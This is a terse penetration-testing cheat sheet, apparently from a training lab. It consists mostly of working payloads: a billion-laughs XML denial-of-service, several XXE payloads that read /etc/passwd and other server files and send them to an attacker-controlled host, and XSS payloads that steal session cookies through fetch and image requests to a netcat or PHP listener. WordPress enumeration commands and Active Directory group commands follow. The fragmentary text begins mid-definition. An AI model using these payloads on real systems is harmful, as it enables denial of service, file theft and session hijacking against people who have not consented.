  <!ENTITY a4 "&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;&a3;">
  <!ENTITY a5 "&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;&a4;">
  <!ENTITY a6 "&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;&a5;">
  <!ENTITY a7 "&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;&a6;">
  <!ENTITY a8 "&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;&a7;">
  <!ENTITY a9 "&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;&a8;">        
  <!ENTITY a10 "&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;&a9;">        
]>
&a10;                                                  || XML loop DOS attack
--------------------------------------------------------------------------------------------

<!ENTITY joined "%begin;%file;%end;">                  || save as file and start python3 file transfer CDATA

<!DOCTYPE email [
  <!ENTITY % begin "<![CDATA["> <!-- prepend the beginning of the CDATA tag -->
  <!ENTITY % file SYSTEM "file:///var/www/html/submitDetails.php"> <!-- reference external file -->
  <!ENTITY % end "]]>"> <!-- append the end of the CDATA tag -->
  <!ENTITY % xxe SYSTEM "http://OUR_IP:8000/xxe.dtd"> <!-- reference our external DTD -->
  %xxe;
]>                                 								|| Error based XXE To read file without encoding and without using PHP wrappers
         
--------------------------------------------------------------------------------------------
<!ENTITY % file SYSTEM "file:///etc/hosts">
<!ENTITY % error "<!ENTITY content SYSTEM '%nonExistingEntity;/%file;'>">  || save as file and start python3 file transfer

<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %error;
]>                  || delete all XXE and paste this and run || To read files in blind

--------------------------------------------------------------------------------------------

<!ENTITY % file SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd">
<!ENTITY % oob "<!ENTITY content SYSTEM 'http://10.10.15.213:8000/?content=%file;'>">       | php -S 0.0.0.0:8000 || Complete blind XXE save file and run php server 

<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE email [ 
  <!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd">
  %remote;
  %oob;
]>
<root>&content;</root>                                                                      || Dont forgot to use correct parameter 
--------------------------------------------------------------------------------------------

Session-Security

Ways to session Indentifier
  Captured through passive traffic/packet sniffin
  Identified in logs
  Predicted
  Brute Forced

Session Attacks
 Session Hijacking
 Session Fixation
 XSS (Cross-Site Scripting)
 CSRF (Cross-Site Request Forgery)
 Open Redirects

XXS-session
 onload
 onerror   "><img src=x onerror=prompt(document.domain)>    "><img src=x onerror=confirm(1)   "><img src=x onerror=alert(1)>   
 onmouseover

 xss-session.php  >>>> php -S <VPN/TUN Adapter IP>:8000  >>>>   <style>@keyframes x{}</style><video style="animation-name:x" onanimationend="window.location = 'http://<VPN/TUN Adapter IP>:8000/log.php?c=' + document.cookie;"></video>  || HTTPS >>>> <h1 onmouseover='document.write(`<img src="https://CUSTOMLINK?cookie=${btoa(document.cookie)}">`)'>test</h1>      
netcat-session  >>>> nc -nlvp 8000   >>>>  <h1 onmouseover='document.write(`<img src="http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}">`)'>test</h1>   

<script>fetch(`http://<VPN/TUN Adapter IP>:8000?cookie=${btoa(document.cookie)}`)</script>

WordPress:
wp-config.php   || wordpress configuration file
wp-content      || Plugins and themes
 uploads        || sub directory of wp-content
login page
  /wp-admin/login.php
  /wp-admin/wp-login.php
  /login.php
  /wp-login.php
Roles
  Administrator  || This user has access to administrative features within the website. This includes adding and deleting users and posts, as well as editing source code.
  Editor   ||  An editor can publish and manage posts, including the posts of other users.
  Author   || Authors can publish and manage their own posts.
  Contributor  || These users can write and manage their own posts but cannot publish them.
  Subscriber  || These are normal users who can browse posts and edit their profiles.
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'wp-content/plugins/*' | cut -d"'" -f2   || To enum plugins
curl -s -X GET http://blog.inlanefreight.com | sed 's/href=/\n/g' | sed 's/src=/\n/g' | grep 'themes' | cut -d"'" -f2  || To enum themes
curl -I -X GET http://blog.inlanefreight.com/wp-content/plugins/mail-masta  || To enum plugins activel  OR Wpscan
 

Cryto:

base64 -d | To decrypt base64
xxd -ps -r | To decrypt hex

AD

net localgroup administrators | To check administrator groups
net group "group name" | To see group members

























